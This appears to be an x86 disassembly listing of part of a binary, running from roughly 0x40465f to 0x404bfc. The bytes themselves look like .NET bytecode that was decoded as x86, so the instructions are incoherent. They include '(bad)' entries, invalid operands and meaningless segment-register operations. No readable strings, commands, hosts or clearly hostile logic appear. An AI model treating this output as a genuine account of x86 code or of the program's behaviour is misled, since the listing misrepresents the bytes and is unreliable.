  40465f:	00 0a                	add    %cl,(%edx)
  404661:	dc de                	(bad)
  404663:	03 26                	add    (%esi),%esp
  404665:	de 00                	fiadds (%eax)
  404667:	16                   	push   %ss
  404668:	2a 11                	sub    (%ecx),%dl
  40466a:	05 2a 01 34 00       	add    $0x34012a,%eax
  40466f:	00 02                	add    %al,(%edx)
  404671:	00 19                	add    %bl,(%ecx)
  404673:	00 8b a4 00 0a 00    	add    %cl,0xa00a4(%ebx)
  404679:	00 00                	add    %al,(%eax)
  40467b:	00 02                	add    %al,(%edx)
  40467d:	00 12                	add    %dl,(%edx)
  40467f:	00 9e b0 00 0a 00    	add    %bl,0xa00b0(%esi)
  404685:	00 00                	add    %al,(%eax)
  404687:	00 02                	add    %al,(%edx)
  404689:	00 0b                	add    %cl,(%ebx)
  40468b:	00 b1 bc 00 0a 00    	add    %dh,0xa00bc(%ecx)
  404691:	00 00                	add    %al,(%eax)
  404693:	00 00                	add    %al,(%eax)
  404695:	00 00                	add    %al,(%eax)
  404697:	00 c8                	add    %cl,%al
  404699:	c8 00 03 01          	enter  $0x300,$0x1
  40469d:	00 00                	add    %al,(%eax)
  40469f:	01 1b                	add    %ebx,(%ebx)
  4046a1:	30 02                	xor    %al,(%edx)
  4046a3:	00 1f                	add    %bl,(%edi)
  4046a5:	00 00                	add    %al,(%eax)
  4046a7:	00 1a                	add    %bl,(%edx)
  4046a9:	00 00                	add    %al,(%eax)
  4046ab:	11 16                	adc    %edx,(%esi)
  4046ad:	0a 28                	or     (%eax),%ch
  4046af:	88 00                	mov    %al,(%eax)
  4046b1:	00 0a                	add    %cl,(%edx)
  4046b3:	6f                   	outsl  %ds:(%esi),(%dx)
  4046b4:	b8 00 00 0a 12       	mov    $0x120a0000,%eax
  4046b9:	00 28                	add    %ch,(%eax)
  4046bb:	79 00                	jns    0x4046bd
  4046bd:	00 06                	add    %al,(%esi)
  4046bf:	26 06                	es push %es
  4046c1:	0b de                	or     %esi,%ebx
  4046c3:	05 26 06 0b de       	add    $0xde0b0626,%eax
  4046c8:	00 07                	add    %al,(%edi)
  4046ca:	2a 00                	sub    (%eax),%al
  4046cc:	01 10                	add    %edx,(%eax)
  4046ce:	00 00                	add    %al,(%eax)
  4046d0:	00 00                	add    %al,(%eax)
  4046d2:	02 00                	add    (%eax),%al
  4046d4:	16                   	push   %ss
  4046d5:	18 00                	sbb    %al,(%eax)
  4046d7:	05 01 00 00 01       	add    $0x1000001,%eax
  4046dc:	1b 30                	sbb    (%eax),%esi
  4046de:	01 00                	add    %eax,(%eax)
  4046e0:	23 00                	and    (%eax),%eax
  4046e2:	00 00                	add    %al,(%eax)
  4046e4:	1b 00                	sbb    (%eax),%eax
  4046e6:	00 11                	add    %dl,(%ecx)
  4046e8:	72 81                	jb     0x40466b
  4046ea:	23 00                	and    (%eax),%eax
  4046ec:	70 28                	jo     0x404716
  4046ee:	78 00                	js     0x4046f0
  4046f0:	00 06                	add    %al,(%esi)
  4046f2:	0a 12                	or     (%edx),%dl
  4046f4:	00 28                	add    %ch,(%eax)
  4046f6:	b9 00 00 0a 2c       	mov    $0x2c0a0000,%ecx
  4046fb:	04 17                	add    $0x17,%al
  4046fd:	0b de                	or     %esi,%ebx
  4046ff:	09 16                	or     %edx,(%esi)
  404701:	0b de                	or     %esi,%ebx
  404703:	05 26 16 0b de       	add    $0xde0b1626,%eax
  404708:	00 07                	add    %al,(%edi)
  40470a:	2a 00                	sub    (%eax),%al
  40470c:	01 10                	add    %edx,(%eax)
  40470e:	00 00                	add    %al,(%eax)
  404710:	00 00                	add    %al,(%eax)
  404712:	00 00                	add    %al,(%eax)
  404714:	1c 1c                	sbb    $0x1c,%al
  404716:	00 05 01 00 00 01    	add    %al,0x1000001
  40471c:	1b 30                	sbb    (%eax),%esi
  40471e:	02 00                	add    (%eax),%al
  404720:	65 00 00             	add    %al,%gs:(%eax)
  404723:	00 1c 00             	add    %bl,(%eax,%eax,1)
  404726:	00 11                	add    %dl,(%ecx)
  404728:	28 8d 00 00 0a 0a    	sub    %cl,0xa0a0000(%ebp)
  40472e:	16                   	push   %ss
  40472f:	0b 2b                	or     (%ebx),%ebp
  404731:	3d 06 07 9a 0c       	cmp    $0xc9a0706,%eax
  404736:	02 08                	add    (%eax),%cl
  404738:	28 7c 00 00          	sub    %bh,0x0(%eax,%eax,1)
  40473c:	06                   	push   %es
  40473d:	6f                   	outsl  %ds:(%esi),(%dx)
  40473e:	5b                   	pop    %ebx
  40473f:	00 00                	add    %al,(%eax)
  404741:	0a 72 99             	or     -0x67(%edx),%dh
  404744:	23 00                	and    (%eax),%eax
  404746:	70 6f                	jo     0x4047b7
  404748:	b0 00                	mov    $0x0,%al
  40474a:	00 0a                	add    %cl,(%edx)
  40474c:	2c 18                	sub    $0x18,%al
  40474e:	7e 10                	jle    0x404760
  404750:	00 00                	add    %al,(%eax)
  404752:	04 72                	add    $0x72,%al
  404754:	b9 23 00 70 28       	mov    $0x28700023,%ecx
  404759:	8d 00                	lea    (%eax),%eax
  40475b:	00 06                	add    %al,(%esi)
  40475d:	26 72 b9             	es jb  0x404719
  404760:	23 00                	and    (%eax),%eax
  404762:	70 0d                	jo     0x404771
  404764:	de 25 de 03 26 de    	fisubs 0xde2603de
  40476a:	00 07                	add    %al,(%edi)
  40476c:	17                   	pop    %ss
  40476d:	58                   	pop    %eax
  40476e:	0b 07                	or     (%edi),%eax
  404770:	06                   	push   %es
  404771:	8e 69 32             	mov    0x32(%ecx),%gs
  404774:	bd 7e 10 00 00       	mov    $0x107e,%ebp
  404779:	04 72                	add    $0x72,%al
  40477b:	b7 20                	mov    $0x20,%bh
  40477d:	00 70 28             	add    %dh,0x28(%eax)
  404780:	8d 00                	lea    (%eax),%eax
  404782:	00 06                	add    %al,(%esi)
  404784:	26 72 b7             	es jb  0x40473e
  404787:	20 00                	and    %al,(%eax)
  404789:	70 2a                	jo     0x4047b5
  40478b:	09 2a                	or     %ebp,(%edx)
  40478d:	00 00                	add    %al,(%eax)
  40478f:	00 01                	add    %al,(%ecx)
  404791:	10 00                	adc    %al,(%eax)
  404793:	00 00                	add    %al,(%eax)
  404795:	00 0e                	add    %cl,(%esi)
  404797:	00 32                	add    %dh,(%edx)
  404799:	40                   	inc    %eax
  40479a:	00 03                	add    %al,(%ebx)
  40479c:	01 00                	add    %eax,(%eax)
  40479e:	00 01                	add    %al,(%ecx)
  4047a0:	1b 30                	sbb    (%eax),%esi
  4047a2:	02 00                	add    (%eax),%al
  4047a4:	6f                   	outsl  %ds:(%esi),(%dx)
  4047a5:	00 00                	add    %al,(%eax)
  4047a7:	00 1d 00 00 11 72    	add    %bl,0x72110000
  4047ad:	bd 23 00 70 03       	mov    $0x3700023,%ebp
  4047b2:	6f                   	outsl  %ds:(%esi),(%dx)
  4047b3:	ba 00 00 0a 0b       	mov    $0xb0a0000,%edx
  4047b8:	12 01                	adc    (%ecx),%al
  4047ba:	28 bb 00 00 0a 28    	sub    %bh,0x280a0000(%ebx)
  4047c0:	51                   	push   %ecx
  4047c1:	00 00                	add    %al,(%eax)
  4047c3:	0a 73 b1             	or     -0x4f(%ebx),%dh
  4047c6:	00 00                	add    %al,(%eax)
  4047c8:	0a 0a                	or     (%edx),%cl
  4047ca:	06                   	push   %es
  4047cb:	6f                   	outsl  %ds:(%esi),(%dx)
  4047cc:	b2 00                	mov    $0x0,%dl
  4047ce:	00 0a                	add    %cl,(%edx)
  4047d0:	0c 08                	or     $0x8,%al
  4047d2:	28 01                	sub    %al,(%ecx)
  4047d4:	00 00                	add    %al,(%eax)
  4047d6:	2b 28                	sub    (%eax),%ebp
  4047d8:	02 00                	add    (%eax),%al
  4047da:	00 2b                	add    %ch,(%ebx)
  4047dc:	25 2d 04 26 14       	and    $0x1426042d,%eax
  4047e1:	2b 16                	sub    (%esi),%edx
  4047e3:	72 2f                	jb     0x404814
  4047e5:	24 00                	and    $0x0,%al
  4047e7:	70 28                	jo     0x404811
  4047e9:	b5 00                	mov    $0x0,%ch
  4047eb:	00 0a                	add    %cl,(%edx)
  4047ed:	25 2d 04 26 14       	and    $0x1426042d,%eax
  4047f2:	2b 05 6f 38 00 00    	sub    0x386f,%eax
  4047f8:	0a 0d de 1d 08 2c    	or     0x2c081dde,%cl
  4047fe:	06                   	push   %es
  4047ff:	08 6f 33             	or     %ch,0x33(%edi)
  404802:	00 00                	add    %al,(%eax)
  404804:	0a dc                	or     %ah,%bl
  404806:	06                   	push   %es
  404807:	2c 06                	sub    $0x6,%al
  404809:	06                   	push   %es
  40480a:	6f                   	outsl  %ds:(%esi),(%dx)
  40480b:	33 00                	xor    (%eax),%eax
  40480d:	00 0a                	add    %cl,(%edx)
  40480f:	dc 26                	fsubl  (%esi)
  404811:	de 00                	fiadds (%eax)
  404813:	72 6d                	jb     0x404882
  404815:	20 00                	and    %al,(%eax)
  404817:	70 2a                	jo     0x404843
  404819:	09 2a                	or     %ebp,(%edx)
  40481b:	00 01                	add    %al,(%ecx)
  40481d:	28 00                	sub    %al,(%eax)
  40481f:	00 02                	add    %al,(%edx)
  404821:	00 25 00 2b 50 00    	add    %ah,0x502b00
  404827:	0a 00                	or     (%eax),%al
  404829:	00 00                	add    %al,(%eax)
  40482b:	00 02                	add    %al,(%edx)
  40482d:	00 1e                	add    %bl,(%esi)
  40482f:	00 3c 5a             	add    %bh,(%edx,%ebx,2)
  404832:	00 0a                	add    %cl,(%edx)
	...
  40483c:	64 64 00 03          	fs add %al,%fs:(%ebx)
  404840:	01 00                	add    %eax,(%eax)
  404842:	00 01                	add    %al,(%ecx)
  404844:	1b 30                	sbb    (%eax),%esi
  404846:	04 00                	add    $0x0,%al
  404848:	5f                   	pop    %edi
  404849:	00 00                	add    %al,(%eax)
  40484b:	00 1e                	add    %bl,(%esi)
  40484d:	00 00                	add    %al,(%eax)
  40484f:	11 1b                	adc    %ebx,(%ebx)
  404851:	8d 01                	lea    (%ecx),%eax
  404853:	00 00                	add    %al,(%eax)
  404855:	01 25 16 28 be 00    	add    %esp,0xbe2816
  40485b:	00 0a                	add    %cl,(%edx)
  40485d:	8c 72 00             	mov    %?,0x0(%edx)
  404860:	00 01                	add    %al,(%ecx)
  404862:	a2 25 17 28 bf       	mov    %al,0xbf281725
  404867:	00 00                	add    %al,(%eax)
  404869:	0a a2 25 18 28 c0    	or     -0x3fd7e7db(%edx),%ah
  40486f:	00 00                	add    %al,(%eax)
  404871:	0a a2 25 19 28 c1    	or     -0x3ed7e6db(%edx),%ah
  404877:	00 00                	add    %al,(%eax)
  404879:	0a a2 25 1a 28 aa    	or     -0x55d7e5db(%edx),%ah
  40487f:	00 00                	add    %al,(%eax)
  404881:	0a 28                	or     (%eax),%ch
  404883:	ab                   	stos   %eax,%es:(%edi)
  404884:	00 00                	add    %al,(%eax)
  404886:	0a 73 ac             	or     -0x54(%ebx),%dh
  404889:	00 00                	add    %al,(%eax)
  40488b:	0a 28                	or     (%eax),%ch
  40488d:	ad                   	lods   %ds:(%esi),%eax
  40488e:	00 00                	add    %al,(%eax)
  404890:	0a 8c 51 00 00 01 a2 	or     -0x5dff0000(%ecx,%edx,2),%cl
  404897:	28 c2                	sub    %al,%dl
  404899:	00 00                	add    %al,(%eax)
  40489b:	0a 28                	or     (%eax),%ch
  40489d:	7f 00                	jg     0x40489f
  40489f:	00 06                	add    %al,(%esi)
  4048a1:	0a de                	or     %dh,%bl
  4048a3:	09 26                	or     %esp,(%esi)
  4048a5:	72 47                	jb     0x4048ee
  4048a7:	24 00                	and    $0x0,%al
  4048a9:	70 0a                	jo     0x4048b5
  4048ab:	de 00                	fiadds (%eax)
  4048ad:	06                   	push   %es
  4048ae:	2a 00                	sub    (%eax),%al
  4048b0:	01 10                	add    %edx,(%eax)
  4048b2:	00 00                	add    %al,(%eax)
  4048b4:	00 00                	add    %al,(%eax)
  4048b6:	00 00                	add    %al,(%eax)
  4048b8:	54                   	push   %esp
  4048b9:	54                   	push   %esp
  4048ba:	00 09                	add    %cl,(%ecx)
  4048bc:	01 00                	add    %eax,(%eax)
  4048be:	00 01                	add    %al,(%ecx)
  4048c0:	13 30                	adc    (%eax),%esi
  4048c2:	03 00                	add    (%eax),%eax
  4048c4:	5a                   	pop    %edx
  4048c5:	00 00                	add    %al,(%eax)
  4048c7:	00 1f                	add    %bl,(%edi)
  4048c9:	00 00                	add    %al,(%eax)
  4048cb:	11 73 c3             	adc    %esi,-0x3d(%ebx)
  4048ce:	00 00                	add    %al,(%eax)
  4048d0:	0a 28                	or     (%eax),%ch
  4048d2:	c4 00                	les    (%eax),%eax
  4048d4:	00 0a                	add    %cl,(%edx)
  4048d6:	02 6f 21             	add    0x21(%edi),%ch
  4048d9:	00 00                	add    %al,(%eax)
  4048db:	0a 0a                	or     (%edx),%cl
  4048dd:	06                   	push   %es
  4048de:	6f                   	outsl  %ds:(%esi),(%dx)
  4048df:	c5 00                	lds    (%eax),%eax
  4048e1:	00 0a                	add    %cl,(%edx)
  4048e3:	0a 73 53             	or     0x53(%ebx),%dh
  4048e6:	00 00                	add    %al,(%eax)
  4048e8:	0a 0b                	or     (%ebx),%cl
  4048ea:	06                   	push   %es
  4048eb:	0c 16                	or     $0x16,%al
  4048ed:	0d 2b 1c 08 09       	or     $0x9081c2b,%eax
  4048f2:	91                   	xchg   %eax,%ecx
  4048f3:	13 04 07             	adc    (%edi,%eax,1),%eax
  4048f6:	12 04 72             	adc    (%edx,%esi,2),%al
  4048f9:	59                   	pop    %ecx
  4048fa:	24 00                	and    $0x0,%al
  4048fc:	70 28                	jo     0x404926
  4048fe:	c6 00 00             	movb   $0x0,(%eax)
  404901:	0a 6f 55             	or     0x55(%edi),%ch
  404904:	00 00                	add    %al,(%eax)
  404906:	0a 26                	or     (%esi),%ah
  404908:	09 17                	or     %edx,(%edi)
  40490a:	58                   	pop    %eax
  40490b:	0d 09 08 8e 69       	or     $0x698e0809,%eax
  404910:	32 de                	xor    %dh,%bl
  404912:	07                   	pop    %es
  404913:	6f                   	outsl  %ds:(%esi),(%dx)
  404914:	38 00                	cmp    %al,(%eax)
  404916:	00 0a                	add    %cl,(%edx)
  404918:	16                   	push   %ss
  404919:	1f                   	pop    %ds
  40491a:	14 6f                	adc    $0x6f,%al
  40491c:	c7 00 00 0a 6f c8    	movl   $0xc86f0a00,(%eax)
  404922:	00 00                	add    %al,(%eax)
  404924:	0a 2a                	or     (%edx),%ch
  404926:	00 00                	add    %al,(%eax)
  404928:	13 30                	adc    (%eax),%esi
  40492a:	07                   	pop    %es
  40492b:	00 b3 01 00 00 20    	add    %dh,0x20000001(%ebx)
  404931:	00 00                	add    %al,(%eax)
  404933:	11 73 62             	adc    %esi,0x62(%ebx)
  404936:	00 00                	add    %al,(%eax)
  404938:	06                   	push   %es
  404939:	25 72 81 20 00       	and    $0x208172,%eax
  40493e:	70 6f                	jo     0x4049af
  404940:	4d                   	dec    %ebp
  404941:	00 00                	add    %al,(%eax)
  404943:	06                   	push   %es
  404944:	72 5f                	jb     0x4049a5
  404946:	24 00                	and    $0x0,%al
  404948:	70 6f                	jo     0x4049b9
  40494a:	5a                   	pop    %edx
  40494b:	00 00                	add    %al,(%eax)
  40494d:	06                   	push   %es
  40494e:	25 72 75 24 00       	and    $0x247572,%eax
  404953:	70 6f                	jo     0x4049c4
  404955:	4d                   	dec    %ebp
  404956:	00 00                	add    %al,(%eax)
  404958:	06                   	push   %es
  404959:	7e 10                	jle    0x40496b
  40495b:	00 00                	add    %al,(%eax)
  40495d:	04 6f                	add    $0x6f,%al
  40495f:	5a                   	pop    %edx
  404960:	00 00                	add    %al,(%eax)
  404962:	06                   	push   %es
  404963:	25 72 7f 24 00       	and    $0x247f72,%eax
  404968:	70 6f                	jo     0x4049d9
  40496a:	4d                   	dec    %ebp
  40496b:	00 00                	add    %al,(%eax)
  40496d:	06                   	push   %es
  40496e:	28 bf 00 00 0a 6f    	sub    %bh,0x6f0a0000(%edi)
  404974:	38 00                	cmp    %al,(%eax)
  404976:	00 0a                	add    %cl,(%edx)
  404978:	6f                   	outsl  %ds:(%esi),(%dx)
  404979:	5a                   	pop    %edx
  40497a:	00 00                	add    %al,(%eax)
  40497c:	06                   	push   %es
  40497d:	25 72 89 24 00       	and    $0x248972,%eax
  404982:	70 6f                	jo     0x4049f3
  404984:	4d                   	dec    %ebp
  404985:	00 00                	add    %al,(%eax)
  404987:	06                   	push   %es
  404988:	73 ae                	jae    0x404938
  40498a:	00 00                	add    %al,(%eax)
  40498c:	0a 28                	or     (%eax),%ch
  40498e:	af                   	scas   %es:(%edi),%eax
  40498f:	00 00                	add    %al,(%eax)
  404991:	0a 6f 38             	or     0x38(%edi),%ch
  404994:	00 00                	add    %al,(%eax)
  404996:	0a 72 8f             	or     -0x71(%edx),%dh
  404999:	24 00                	and    $0x0,%al
  40499b:	70 14                	jo     0x4049b1
  40499d:	6f                   	outsl  %ds:(%esi),(%dx)
  40499e:	c9                   	leave
  40499f:	00 00                	add    %al,(%eax)
  4049a1:	0a 72 a3             	or     -0x5d(%edx),%dh
  4049a4:	24 00                	and    $0x0,%al
  4049a6:	70 28                	jo     0x4049d0
  4049a8:	ca 00 00             	lret   $0x0
  4049ab:	0a 0a                	or     (%edx),%cl
  4049ad:	12 00                	adc    (%eax),%al
  4049af:	28 cb                	sub    %cl,%bl
  4049b1:	00 00                	add    %al,(%eax)
  4049b3:	0a 72 a7             	or     -0x59(%edx),%dh
  4049b6:	24 00                	and    $0x0,%al
  4049b8:	70 72                	jo     0x404a2c
  4049ba:	b1 24                	mov    $0x24,%cl
  4049bc:	00 70 6f             	add    %dh,0x6f(%eax)
  4049bf:	c9                   	leave
  4049c0:	00 00                	add    %al,(%eax)
  4049c2:	0a 72 bd             	or     -0x43(%edx),%dh
  4049c5:	24 00                	and    $0x0,%al
  4049c7:	70 72                	jo     0x404a3b
  4049c9:	c9                   	leave
  4049ca:	24 00                	and    $0x0,%al
  4049cc:	70 6f                	jo     0x404a3d
  4049ce:	c9                   	leave
  4049cf:	00 00                	add    %al,(%eax)
  4049d1:	0a 28                	or     (%eax),%ch
  4049d3:	9c                   	pushf
  4049d4:	00 00                	add    %al,(%eax)
  4049d6:	0a 6f 5a             	or     0x5a(%edi),%ch
  4049d9:	00 00                	add    %al,(%eax)
  4049db:	06                   	push   %es
  4049dc:	25 72 d5 24 00       	and    $0x24d572,%eax
  4049e1:	70 6f                	jo     0x404a52
  4049e3:	4d                   	dec    %ebp
  4049e4:	00 00                	add    %al,(%eax)
  4049e6:	06                   	push   %es
  4049e7:	28 cc                	sub    %cl,%ah
  4049e9:	00 00                	add    %al,(%eax)
  4049eb:	0a 6f 5a             	or     0x5a(%edi),%ch
  4049ee:	00 00                	add    %al,(%eax)
  4049f0:	06                   	push   %es
  4049f1:	25 72 df 24 00       	and    $0x24df72,%eax
  4049f6:	70 6f                	jo     0x404a67
  4049f8:	4d                   	dec    %ebp
  4049f9:	00 00                	add    %al,(%eax)
  4049fb:	06                   	push   %es
  4049fc:	7e 03                	jle    0x404a01
  4049fe:	00 00                	add    %al,(%eax)
  404a00:	04 6f                	add    $0x6f,%al
  404a02:	5a                   	pop    %edx
  404a03:	00 00                	add    %al,(%eax)
  404a05:	06                   	push   %es
  404a06:	25 72 ef 24 00       	and    $0x24ef72,%eax
  404a0b:	70 6f                	jo     0x404a7c
  404a0d:	4d                   	dec    %ebp
  404a0e:	00 00                	add    %al,(%eax)
  404a10:	06                   	push   %es
  404a11:	28 81 00 00 06 0a    	sub    %al,0xa060000(%ecx)
  404a17:	12 00                	adc    (%eax),%al
  404a19:	28 cb                	sub    %cl,%bl
  404a1b:	00 00                	add    %al,(%eax)
  404a1d:	0a 6f 5b             	or     0x5b(%edi),%ch
  404a20:	00 00                	add    %al,(%eax)
  404a22:	0a 72 fb             	or     -0x5(%edx),%dh
  404a25:	24 00                	and    $0x0,%al
  404a27:	70 72                	jo     0x404a9b
  404a29:	ef                   	out    %eax,(%dx)
  404a2a:	24 00                	and    $0x0,%al
  404a2c:	70 6f                	jo     0x404a9d
  404a2e:	c9                   	leave
  404a2f:	00 00                	add    %al,(%eax)
  404a31:	0a 72 05             	or     0x5(%edx),%dh
  404a34:	25 00 70 72 7f       	and    $0x7f727000,%eax
  404a39:	24 00                	and    $0x0,%al
  404a3b:	70 6f                	jo     0x404aac
  404a3d:	c9                   	leave
  404a3e:	00 00                	add    %al,(%eax)
  404a40:	0a 6f 5a             	or     0x5a(%edi),%ch
  404a43:	00 00                	add    %al,(%eax)
  404a45:	06                   	push   %es
  404a46:	25 72 11 25 00       	and    $0x251172,%eax
  404a4b:	70 6f                	jo     0x404abc
  404a4d:	4d                   	dec    %ebp
  404a4e:	00 00                	add    %al,(%eax)
  404a50:	06                   	push   %es
  404a51:	72 a9                	jb     0x4049fc
  404a53:	20 00                	and    %al,(%eax)
  404a55:	70 7e                	jo     0x404ad5
  404a57:	10 00                	adc    %al,(%eax)
  404a59:	00 04 28             	add    %al,(%eax,%ebp,1)
  404a5c:	8e 00                	mov    (%eax),%es
  404a5e:	00 06                	add    %al,(%esi)
  404a60:	25 2d 06 26 72       	and    $0x7226062d,%eax
  404a65:	b7 20                	mov    $0x20,%bh
  404a67:	00 70 28             	add    %dh,0x28(%eax)
  404a6a:	51                   	push   %ecx
  404a6b:	00 00                	add    %al,(%eax)
  404a6d:	0a 6f 5a             	or     0x5a(%edi),%ch
  404a70:	00 00                	add    %al,(%eax)
  404a72:	06                   	push   %es
  404a73:	25 72 29 25 00       	and    $0x252972,%eax
  404a78:	70 6f                	jo     0x404ae9
  404a7a:	4d                   	dec    %ebp
  404a7b:	00 00                	add    %al,(%eax)
  404a7d:	06                   	push   %es
  404a7e:	7e 0e                	jle    0x404a8e
  404a80:	00 00                	add    %al,(%eax)
  404a82:	04 6f                	add    $0x6f,%al
  404a84:	5a                   	pop    %edx
  404a85:	00 00                	add    %al,(%eax)
  404a87:	06                   	push   %es
  404a88:	25 72 3b 25 00       	and    $0x253b72,%eax
  404a8d:	70 6f                	jo     0x404afe
  404a8f:	4d                   	dec    %ebp
  404a90:	00 00                	add    %al,(%eax)
  404a92:	06                   	push   %es
  404a93:	28 83 00 00 06 6f    	sub    %al,0x6f060000(%ebx)
  404a99:	5a                   	pop    %edx
  404a9a:	00 00                	add    %al,(%eax)
  404a9c:	06                   	push   %es
  404a9d:	25 72 4f 25 00       	and    $0x254f72,%eax
  404aa2:	70 6f                	jo     0x404b13
  404aa4:	4d                   	dec    %ebp
  404aa5:	00 00                	add    %al,(%eax)
  404aa7:	06                   	push   %es
  404aa8:	28 cc                	sub    %cl,%ah
  404aaa:	00 00                	add    %al,(%eax)
  404aac:	0a 73 87             	or     -0x79(%ebx),%dh
  404aaf:	00 00                	add    %al,(%eax)
  404ab1:	0a 28                	or     (%eax),%ch
  404ab3:	cd 00                	int    $0x0
  404ab5:	00 0a                	add    %cl,(%edx)
  404ab7:	0b 12                	or     (%edx),%edx
  404ab9:	01 28                	add    %ebp,(%eax)
  404abb:	ce                   	into
  404abc:	00 00                	add    %al,(%eax)
  404abe:	0a 0b                	or     (%ebx),%cl
  404ac0:	12 01                	adc    (%ecx),%al
  404ac2:	28 cf                	sub    %cl,%bh
  404ac4:	00 00                	add    %al,(%eax)
  404ac6:	0a 6f 5a             	or     0x5a(%edi),%ch
  404ac9:	00 00                	add    %al,(%eax)
  404acb:	06                   	push   %es
  404acc:	25 72 63 25 00       	and    $0x256372,%eax
  404ad1:	70 6f                	jo     0x404b42
  404ad3:	4d                   	dec    %ebp
  404ad4:	00 00                	add    %al,(%eax)
  404ad6:	06                   	push   %es
  404ad7:	72 6d                	jb     0x404b46
  404ad9:	20 00                	and    %al,(%eax)
  404adb:	70 6f                	jo     0x404b4c
  404add:	5a                   	pop    %edx
  404ade:	00 00                	add    %al,(%eax)
  404ae0:	06                   	push   %es
  404ae1:	6f                   	outsl  %ds:(%esi),(%dx)
  404ae2:	57                   	push   %edi
  404ae3:	00 00                	add    %al,(%eax)
  404ae5:	06                   	push   %es
  404ae6:	2a 00                	sub    (%eax),%al
  404ae8:	1b 30                	sbb    (%eax),%esi
  404aea:	02 00                	add    (%eax),%al
  404aec:	43                   	inc    %ebx
  404aed:	00 00                	add    %al,(%eax)
  404aef:	00 00                	add    %al,(%eax)
  404af1:	00 00                	add    %al,(%eax)
  404af3:	00 7e 0f             	add    %bh,0xf(%esi)
  404af6:	00 00                	add    %al,(%eax)
  404af8:	04 28                	add    $0x28,%al
  404afa:	17                   	pop    %ss
  404afb:	00 00                	add    %al,(%eax)
  404afd:	0a 2c 0c             	or     (%esp,%ecx,1),%ch
  404b00:	28 81 00 00 06 2c    	sub    %al,0x2c060000(%ecx)
  404b06:	05 28 8b 00 00       	add    $0x8b28,%eax
  404b0b:	06                   	push   %es
  404b0c:	28 88 00 00 06 28    	sub    %cl,0x28060000(%eax)
  404b12:	08 00                	or     %al,(%eax)
  404b14:	00 06                	add    %al,(%esi)
  404b16:	25 2d 03 26 2b       	and    $0x2b26032d,%eax
  404b1b:	05 6f 76 00 00       	add    $0x766f,%eax
  404b20:	0a 28                	or     (%eax),%ch
  404b22:	06                   	push   %es
  404b23:	00 00                	add    %al,(%eax)
  404b25:	06                   	push   %es
  404b26:	25 2d 03 26 2b       	and    $0x2b26032d,%eax
  404b2b:	05 28 d3 00 00       	add    $0xd328,%eax
  404b30:	0a de                	or     %dh,%bl
  404b32:	03 26                	add    (%esi),%esp
  404b34:	de 00                	fiadds (%eax)
  404b36:	2a 00                	sub    (%eax),%al
  404b38:	01 10                	add    %edx,(%eax)
  404b3a:	00 00                	add    %al,(%eax)
  404b3c:	00 00                	add    %al,(%eax)
  404b3e:	00 00                	add    %al,(%eax)
  404b40:	3f                   	aas
  404b41:	3f                   	aas
  404b42:	00 03                	add    %al,(%ebx)
  404b44:	01 00                	add    %eax,(%eax)
  404b46:	00 01                	add    %al,(%ecx)
  404b48:	1b 30                	sbb    (%eax),%esi
  404b4a:	03 00                	add    (%eax),%eax
  404b4c:	a0 00 00 00 21       	mov    0x21000000,%al
  404b51:	00 00                	add    %al,(%eax)
  404b53:	11 72 6d             	adc    %esi,0x6d(%edx)
  404b56:	25 00 70 28 c0       	and    $0xc0287000,%eax
  404b5b:	00 00                	add    %al,(%eax)
  404b5d:	0a 72 73             	or     0x73(%edx),%dh
  404b60:	25 00 70 28 9c       	and    $0x9c287000,%eax
  404b65:	00 00                	add    %al,(%eax)
  404b67:	0a 72 9f             	or     -0x61(%edx),%dh
  404b6a:	25 00 70 73 d4       	and    $0xd4737000,%eax
  404b6f:	00 00                	add    %al,(%eax)
  404b71:	0a 0a                	or     (%edx),%cl
  404b73:	73 d5                	jae    0x404b4a
  404b75:	00 00                	add    %al,(%eax)
  404b77:	0a 0b                	or     (%ebx),%cl
  404b79:	06                   	push   %es
  404b7a:	6f                   	outsl  %ds:(%esi),(%dx)
  404b7b:	b2 00                	mov    $0x0,%dl
  404b7d:	00 0a                	add    %cl,(%edx)
  404b7f:	6f                   	outsl  %ds:(%esi),(%dx)
  404b80:	b3 00                	mov    $0x0,%bl
  404b82:	00 0a                	add    %cl,(%edx)
  404b84:	0c 2b                	or     $0x2b,%al
  404b86:	1d 08 6f b4 00       	sbb    $0xb46f08,%eax
  404b8b:	00 0a                	add    %cl,(%edx)
  404b8d:	0d 07 09 72 dd       	or     $0xdd720907,%eax
  404b92:	25 00 70 6f b5       	and    $0xb56f7000,%eax
  404b97:	00 00                	add    %al,(%eax)
  404b99:	0a 6f 38             	or     0x38(%edi),%ch
  404b9c:	00 00                	add    %al,(%eax)
  404b9e:	0a 6f d6             	or     -0x2a(%edi),%ch
  404ba1:	00 00                	add    %al,(%eax)
  404ba3:	0a 08                	or     (%eax),%cl
  404ba5:	6f                   	outsl  %ds:(%esi),(%dx)
  404ba6:	b7 00                	mov    $0x0,%bh
  404ba8:	00 0a                	add    %cl,(%edx)
  404baa:	2d db de 0a 08       	sub    $0x80adedb,%eax
  404baf:	2c 06                	sub    $0x6,%al
  404bb1:	08 6f 33             	or     %ch,0x33(%edi)
  404bb4:	00 00                	add    %al,(%eax)
  404bb6:	0a dc                	or     %ah,%bl
  404bb8:	07                   	pop    %es
  404bb9:	6f                   	outsl  %ds:(%esi),(%dx)
  404bba:	d7                   	xlat   %ds:(%ebx)
  404bbb:	00 00                	add    %al,(%eax)
  404bbd:	0a 2d 09 72 f5 25    	or     0x25f57209,%ch
  404bc3:	00 70 13             	add    %dh,0x13(%eax)
  404bc6:	04 de                	add    $0xde,%al
  404bc8:	28 72 fd             	sub    %dh,-0x3(%edx)
  404bcb:	25 00 70 07 6f       	and    $0x6f077000,%eax
  404bd0:	d8 00                	fadds  (%eax)
  404bd2:	00 0a                	add    %cl,(%edx)
  404bd4:	28 d9                	sub    %bl,%cl
  404bd6:	00 00                	add    %al,(%eax)
  404bd8:	0a 13                	or     (%ebx),%dl
  404bda:	04 de                	add    $0xde,%al
  404bdc:	14 06                	adc    $0x6,%al
  404bde:	2c 06                	sub    $0x6,%al
  404be0:	06                   	push   %es
  404be1:	6f                   	outsl  %ds:(%esi),(%dx)
  404be2:	33 00                	xor    (%eax),%eax
  404be4:	00 0a                	add    %cl,(%edx)
  404be6:	dc 26                	fsubl  (%esi)
  404be8:	72 f5                	jb     0x404bdf
  404bea:	25 00 70 13 04       	and    $0x4137000,%eax
  404bef:	de 00                	fiadds (%eax)
  404bf1:	11 04 2a             	adc    %eax,(%edx,%ebp,1)
  404bf4:	01 28                	add    %ebp,(%eax)
  404bf6:	00 00                	add    %al,(%eax)
  404bf8:	02 00                	add    (%eax),%al
  404bfa:	31 00                	xor    %eax,(%eax)
  404bfc:	29 5a 00             	sub    %ebx,0x0(%edx)
